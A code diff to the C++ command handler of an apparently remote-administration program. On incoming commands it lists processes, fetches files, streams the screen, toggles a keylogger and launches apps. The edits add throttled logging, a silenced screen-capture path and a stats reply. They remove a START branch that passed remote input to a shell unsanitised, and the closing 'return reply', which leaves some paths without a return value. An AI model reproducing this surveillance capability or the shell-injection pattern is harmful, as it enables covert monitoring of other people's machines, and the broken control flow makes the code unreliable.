@@ -13,7 +13,9 @@
 #include "../core/constants.h"
 #include "server_control.h"
 #include "../common/string_utils.h"
-
+#include "system_stats.h"
+#include <unordered_map>
+#include <chrono>
 #include <sstream>
 #include <fstream>
 #include <filesystem>
@@ -38,31 +40,67 @@ CommandHandler::CommandHandler(
 		ServerController *serverController,
 		LivestreamServer *livestreamServer,
 		KeyloggerSender *keyloggerServer) : logger(logger),
-																				threadManager(threadManager),
-																				processManager(processManager),
-																				appManager(appManager),
-																				screenCapture(screenCapture),
-																				serverController(serverController),
-																				livestreamServer(livestreamServer),
-																				keyloggerServer(keyloggerServer)
+		threadManager(threadManager),
+		processManager(processManager),
+		appManager(appManager),
+		screenCapture(screenCapture),
+		serverController(serverController),
+		livestreamServer(livestreamServer),
+		keyloggerServer(keyloggerServer)
 {
 	logger->log("HANDLER", "CommandHandler initialized");
 }
 
 std::string CommandHandler::processCommand(const std::string &command)
 {
-	logger->log("PROCESS", "Processing command: " + command);
-	cout << "Processing command: " << command << endl;
-	std::string reply;
+       static std::unordered_map<std::string, std::chrono::steady_clock::time_point> last_log_times;
+    static std::unordered_map<std::string, int> command_counters;
+    static std::unordered_map<std::string, bool> first_log_printed;
+    
+    bool should_log = true;
+    
+    // Throttle high-frequency commands
+    if (command == "SCREEN_CAPTURE" || command == "SYSTEM_STATS") {
+        auto& counter = command_counters[command];
+        auto& first_logged = first_log_printed[command];
+        
+        counter++;
+        
+        // Only log ONCE on first call with special message
+        if (!first_logged) {
+            first_logged = true;
+            last_log_times[command] = std::chrono::steady_clock::now();
+            logger->log("PROCESS", command + " (CONSTANTLY UPDATED - throttled logging enabled)");
+            should_log = false;
+        } else {
+            // After first log, only log every 100 calls OR every 30 seconds
+            auto now = std::chrono::steady_clock::now();
+            auto& last_time = last_log_times[command];
+            
+            if (counter % 100 == 0 && 
+                std::chrono::duration_cast<std::chrono::seconds>(now - last_time).count() >= 30) {
+                last_time = now;
+                logger->log("PROCESS", command + " (called " + std::to_string(counter) + " times total)");
+            }
+            should_log = false;  // Always suppress after first log
+        }
+    }
+    
+    if (should_log) {
+        logger->log("PROCESS", "Processing command: " + command);
+        cout << "Processing command: " + command << endl;
+    }
+    
+    // Ensure server directory exists
+    std::filesystem::create_directories("./server");
+    std::string reply;
 
-	// Ensure server directory exists
-	std::filesystem::create_directories("./server");
+    // Commands that use chunked data transfer
+    if (command == "PROCESS_LIST" || command == "APP_LIST")
+    {
+        return handleProcessCommandsChunked(command);
+    }
 
-	// Commands that use chunked data transfer
-	if (command == "PROCESS_LIST" || command == "APP_LIST")
-	{
-		return handleProcessCommandsChunked(command);
-	}
 	// File system commands that use chunked transfer
 	else if (command == "LS" || command.rfind("LS ", 0) == 0 || command.rfind("GET ", 0) == 0)
 	{
@@ -82,14 +120,51 @@ std::string CommandHandler::processCommand(const std::string &command)
 	}
 	// Screen capture command
 	else if (command == "SCREEN_CAPTURE")
-	{
-		return handleFileCommandsChunked(command);
-	}
+{
+    // Silent logging for screen capture (used in streaming)
+    // logger->log("CAPTURE", "Screen capture requested");  // COMMENT OUT THIS LINE
+
+    try
+    {
+        cv::Mat screenshot = screenCapture->captureFullScreen();
+        if (screenshot.empty())
+        {
+            logger->log("ERROR", "Failed to capture screenshot");
+            return "CHUNKED_ERROR: Screen capture failed";
+        }
+
+        std::vector<uint8_t> imageData = screenCapture->encodeToJPEG(screenshot, SCREEN_CAPTURE_JPEG_QUALITY);
+        if (imageData.empty())
+        {
+            logger->log("ERROR", "Failed to encode screenshot");
+            return "CHUNKED_ERROR: Image encoding failed";
+        }
+
+        // Silent mode - no logging for streaming
+        // logger->log("CAPTURE", "Screenshot captured, size: " + std::to_string(imageData.size()) + " bytes");
+
+        // Silent progress callback (no logging)
+        auto progressCallback = [](const char *data, uint32_t currentChunk, uint32_t totalChunks, size_t bytesTransferred, size_t totalBytes)
+        {
+            // Silent - no logging for streaming performance
+        };
+
+        bool success = serverController->sendData(reinterpret_cast<const char *>(imageData.data()), imageData.size(), DataTransferCommand::SCREEN_CAPTURE, progressCallback);
+
+        return success ? "CHUNKED_SUCCESS" : "CHUNKED_ERROR: Screen capture transfer failed";
+    }
+    catch (const std::exception &e)
+    {
+        logger->log("ERROR", "Screen capture exception: " + std::string(e.what()));
+        return "CHUNKED_ERROR: Screen capture exception";
+    }
+}
 	// Streaming commands
 	else if (command == "LIVESTREAM" || command == "STOPLIVESTREAM")
 	{
 		reply = handleStreamingCommands(command);
 	}
+	
 	// Keylogger commands
 	else if (command == "KEYLOG" || command == "STOPKEYLOG")
 	{
@@ -100,13 +175,27 @@ std::string CommandHandler::processCommand(const std::string &command)
 	{
 		reply = handleSystemCommands(command);
 	}
-	else
-	{
-		logger->log("UNKNOWN", "UNKNOWN COMMAND received: " + command);
-		reply = "Unknown command: " + command;
-	}
+	else if (command == "SYSTEM_STATS")
+{
+    // Return system stats without additional logging here.
+    // Throttled/initial notice is handled in the top of processCommand().
 
-	return reply;
+    SystemStats stats = SystemMonitor::getStats();
+
+    // Format JSON response
+    std::ostringstream json;
+    json << std::fixed << std::setprecision(1);
+    json << "{"
+         << "\"cpu_percent\":" << stats.cpu_percent << ","
+         << "\"mem_used_gb\":" << stats.mem_used_gb << ","
+         << "\"mem_total_gb\":" << stats.mem_total_gb << ","
+         << "\"mem_percent\":" << stats.mem_percent << ","
+         << "\"process_count\":" << stats.process_count << ","
+         << "\"uptime\":\"" << stats.uptime << "\""
+         << "}";
+
+    return json.str();
+}
 }
 
 std::string CommandHandler::handleProcessCommands(const std::string &command)
@@ -141,47 +230,42 @@ std::string CommandHandler::handleProcessCommands(const std::string &command)
 
 		return csvData;
 	}
-	else if (command.rfind("START ", 0) == 0)
-	{
-		std::string processPath = command.substr(6);
-		logger->log("START", "Starting process: " + processPath);
+	else if (command.rfind("APP_START ", 0) == 0)
+{
+    std::string appPath = command.substr(10);
+    
+    // Trim whitespace
+    appPath.erase(0, appPath.find_first_not_of(" \t\n\r\f\v"));
+    appPath.erase(appPath.find_last_not_of(" \t\n\r\f\v") + 1);
+    
+    if (appPath.empty())
+    {
+        std::string response = "ERROR: No application name provided";
+        cout << response << endl;
+        logger->log("APP_START", response);
+        return response;
+    }
+    
+    logger->log("APP_START", "Starting application: " + appPath);
 
-		// Use system command and capture output
-		std::string systemCommand = "start \"\" \"" + processPath + "\" 2>&1";
-		FILE *pipe = _popen(systemCommand.c_str(), "r");
-
-		if (!pipe)
-		{
-			std::string response = "ERROR: Failed to execute start command - system error";
-			cout << response << endl;
-			logger->log("START", response);
-			return response;
-		}
-
-		char buffer[512];
-		std::string commandOutput;
-		while (fgets(buffer, sizeof(buffer), pipe) != NULL)
-		{
-			commandOutput += buffer;
-		}
-
-		int result = _pclose(pipe);
-
-		if (result == 0)
-		{
-			std::string response = "ACK: Process started successfully: " + processPath;
-			cout << response << endl;
-			logger->log("START", response);
-			return response;
-		}
-		else
-		{
-			std::string response = commandOutput + " - " + processPath;
-			cout << response << endl;
-			logger->log("START", response);
-			return response;
-		}
-	}
+    // Use AppManager for robust app launching
+    bool success = appManager->startApp(appPath, "");
+    
+    if (success)
+    {
+        std::string response = "ACK: Application started successfully: " + appPath;
+        cout << response << endl;
+        logger->log("APP_START", response);
+        return response;
+    }
+    else
+    {
+        std::string response = "ERROR: Failed to start application: " + appPath;
+        cout << response << endl;
+        logger->log("APP_START", response);
+        return response;
+    }
+}
 	else if (command.rfind("STOP ", 0) == 0)
 	{
 		std::string processIdentifier = command.substr(5);
